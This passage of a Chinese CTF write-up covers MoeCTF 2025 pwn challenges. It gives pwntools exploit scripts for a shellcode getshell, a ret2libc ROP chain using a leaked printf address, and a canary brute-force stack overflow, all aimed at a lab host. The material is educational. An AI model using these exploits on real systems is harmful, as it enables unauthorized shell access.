+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You can only make one change!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">prot</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You can only make one change!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">prot</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_24</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid choice. The space remains in its chaotic state.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">mprotect</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">,</span> <span class="n">prot</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mprotect&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">You have now changed the permissions of the shellcode area.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;If you can&#39;t input your shellcode, think about the permissions you just set.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">s</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在main函数最底下我们看到了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">s</span><span class="p">)();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的意思是读取0x1000ull长度的shellcode去执行，这里其实是一个很大的漏洞。</p>
+<p>其实看main函数的话，仔细点阅读理解你就发现其实这题没那么可怕O(∩_∩)O&hellip;前面的几乎是废话来的（说直白点&hellip;）只要scanf执行时，v4被赋值成4就完事顺利了。</p>
+<p>然后就写能getshell的shellcode，exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.149.1&#39;</span><span class="p">,</span><span class="mi">34347</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;I will give you some choices. Choose wisely!&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;think about the permissions you just set.&#39;</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3-认识libc">3 认识libc
+</h3><hr>
+<p>这一次你没有了 backdoor 函数，程序也没有用到类似 <code>system</code> 的函数，那么你将如何 getshell 呢？此时就要从 libc 中寻找答案了。你知道达成什么样的条件才能 ret2libc 吗？我给了你一个钥匙，试着使用它吧！</p>
+<p>在这道题，你需要对二进制文件执行 <code>patchelf</code>，我在指北中已经为你描述了如何 patch，为什么要 patch。祝你玩的愉快！</p>
+<hr>
+<p>checksec:</p>
+<p><img src="/p/moectf_2025/46.png"
+	width="780"
+	height="210"
+	srcset="/p/moectf_2025/46_hu_4ee6dc29755066c6.png 480w, /p/moectf_2025/46_hu_1d573a750c54fd4f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="371"
+		data-flex-basis="891px"
+	
+></p>
+<p>64位只开了NX保护。</p>
+<p>IDA64分析：</p>
+<p><img src="/p/moectf_2025/47.png"
+	width="960"
+	height="186"
+	srcset="/p/moectf_2025/47_hu_e5df94d921f8551a.png 480w, /p/moectf_2025/47_hu_89e285bba0bbe4a5.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="516"
+		data-flex-basis="1238px"
+	
+></p>
+<p><img src="/p/moectf_2025/48.png"
+	width="785"
+	height="176"
+	srcset="/p/moectf_2025/48_hu_b58529ef6e57cec1.png 480w, /p/moectf_2025/48_hu_ce978597d54dac81.png 1024w"
+	loading="lazy"
+	
+		alt="vuln函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="446"
+		data-flex-basis="1070px"
+	
+></p>
+<p>没有直接给东西你后入，只能构造后门，既然题目有提示，那就不多说开始ret2libc手法(●&rsquo;◡&rsquo;●)</p>
+<p>main函数泄露了printf地址，可以用<code>基地址（libc_base） = 函数当前地址 - libc库的该函数的偏移量</code></p>
+<p><img src="/p/moectf_2025/49.png"
+	width="935"
+	height="540"
+	srcset="/p/moectf_2025/49_hu_c0fb94dcb2ed04e3.png 480w, /p/moectf_2025/49_hu_80fbaba6a02dbf6d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="415px"
+	
+></p>
+<p>这里我尝试了几次，发现printf地址都是随机（地址随机化布局保护）且都是14位数字，那我们在编写payload可以注意一下长度不要接收多余字符噢。</p>
+<p>然后借此得出libc_base基地址，就可以反推出system函数在此程序的真实地址了，构造出后门函数。</p>
+<p>泄露地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A gift of forbidden knowledge, the location of </span><span class="se">\&#39;</span><span class="s1">printf</span><span class="se">\&#39;</span><span class="s1">: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为这是64位程序，参数传递是靠寄存器的，还得进行ROP攻击链构造，给system传参需要rdi</p>
+<p>ROPgadget查询：（0x000000000002a3e5 : pop rdi ; ret）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary libc.so.6 --only <span class="s2">&#34;pop|ret&#34;</span> <span class="p">|</span> grep rdi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>这里用libc去查pop rdi ; ret的原因是在那个程序查不到这个单独含rdi的gadget：</p>
+<p><img src="/p/moectf_2025/50.png"
+	width="1130"
+	height="70"
+	srcset="/p/moectf_2025/50_hu_39cd7eddae147f3e.png 480w, /p/moectf_2025/50_hu_915c8abe99ccd27e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1614"
+		data-flex-basis="3874px"
+	
+></p>
+<p>这个就比较杂了，我直接用libc的gadget偏移量去反推出在这个程序里面的gadget的地址就好了，调用也方便。</p>
+</blockquote>
+<p><img src="/p/moectf_2025/51.png"
+	width="1215"
+	height="231"
+	srcset="/p/moectf_2025/51_hu_b171b0030d06686f.png 480w, /p/moectf_2025/51_hu_6f6b8e9a0e7bc32.png 1024w"
+	loading="lazy"
+	
+		alt="ret：0x000000000040101a"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="525"
+		data-flex-basis="1262px"
+	
+></p>
+<p>exp（python3）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.149.1&#39;</span><span class="p">,</span><span class="mi">44080</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;A gift of forbidden knowledge, the location of </span><span class="se">\&#39;</span><span class="s1">printf</span><span class="se">\&#39;</span><span class="s1">: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x000000000002a3e5</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="boom">boom
+</h3><hr>
+<blockquote>
+<p><strong>本题原分值 200 pts（另见 <code>boom_revenge</code>）</strong></p>
+</blockquote>
+<p>你可以轻易爆破我们的系统，但是一个不可泄露的“canary”你又该如何应对？</p>
+<blockquote>
+<p>你可能需要使用 Python <code>ctypes</code> 包来直接调用 C 库函数。</p>
+<p>本题解法与时间有关，如果你出现本地能通远程不通的情况，请多试几次。</p>
+</blockquote>
+<hr>
+<p>checksec:</p>
+<p><img src="/p/moectf_2025/52.png"
+	width="675"
+	height="231"
+	srcset="/p/moectf_2025/52_hu_a6a77121aa9df3cd.png 480w, /p/moectf_2025/52_hu_6660f3073ab9c384.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="292"
+		data-flex-basis="701px"
+	
+></p>
+<p>IDA分析：</p>
+<p>win函数：</p>
+<p><img src="/p/moectf_2025/54.png"
+	width="700"
+	height="204"
+	srcset="/p/moectf_2025/54_hu_117830051b3c8f78.png 480w, /p/moectf_2025/54_hu_76cdd1c9ae715808.png 1024w"
+	loading="lazy"
+	
+		alt="地址：0x401276"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="343"
+		data-flex-basis="823px"
+	
+></p>
+<p>main函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cc" data-lang="cc"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">124</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-90h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+7Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+8Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to Secret Message Book!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Do you want to brute-force this system? (y/n)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">brute_choice</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">brute_choice</span> <span class="o">==</span> <span class="mi">121</span> <span class="o">||</span> <span class="n">brute_choice</span> <span class="o">==</span> <span class="mi">89</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">canary</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">114514</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;waiting...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;boom!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Brute-force mode enabled! Security on.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Normal mode. No overflow allowed.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter your message: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&amp;&amp;</span> <span class="n">v5</span> <span class="o">!=</span> <span class="n">canary</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Security check failed!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Message received.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里有个静态的canary，要绕过这段代码中的静态 Canary 检查，需利用 <strong>栈溢出漏洞 + Canary 泄漏与重写</strong> 的思路。</p>
+<p>代码中存在两个关键分支：</p>
+<p>当用户选择 brute-force 模式（输入 y 或 Y）时，程序会生成一个<strong>随机 Canary（canary = random() % 114514）</strong>，并通过 gets(s) 读取输入（gets 存在栈溢出漏洞，可读取任意长度输入）；</p>
+<p>最后通过<code>v5 != canary</code>检查 Canary 是否被篡改，若不一致则程序退出。</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p>好，接下来来了解一下canary是怎么运作的，进行检查栈溢出的原理是什么。</p>
+<p><code>Canary 位于缓冲区和返回地址之间</code>：以题目中的栈布局为例，Canary 位于 <code>s</code> 缓冲区末尾之后、返回地址之前，形成 “缓冲区 → Canary → 返回地址” 的防护链。这样设计的目的是：若攻击者试图通过缓冲区溢出覆盖返回地址，必须先覆盖 Canary，从而触发校验。</p>
+</blockquote></blockquote>
+<blockquote class="alert alert-warn">
+    <blockquote>
+<p>要注意的是，canary是int 32位的噢：</p>
+<p><img src="/p/moectf_2025/53.png"
+	width="740"
+	height="254"
+	srcset="/p/moectf_2025/53_hu_5b4597e52f8773c5.png 480w, /p/moectf_2025/53_hu_bc3c862ac493afb1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="699px"
+	
+></p>
+</blockquote></blockquote>
+<p>也就是说需要满足canary校验就可以，多次上传payload，爆破canary的值，只要有一次校验通过就能getshell。</p>
+<p>大致exp框架：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span><span class="p">,</span> <span class="n">cdll</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.149.1&#39;</span><span class="p">,)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getshell</span> <span class="o">=</span> <span class="mh">0x401276</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Do you want to brute-force this system? (y/n)&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your message: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">124</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">getshell</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实到这里我也不会了，需要借助AI了，对话1：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
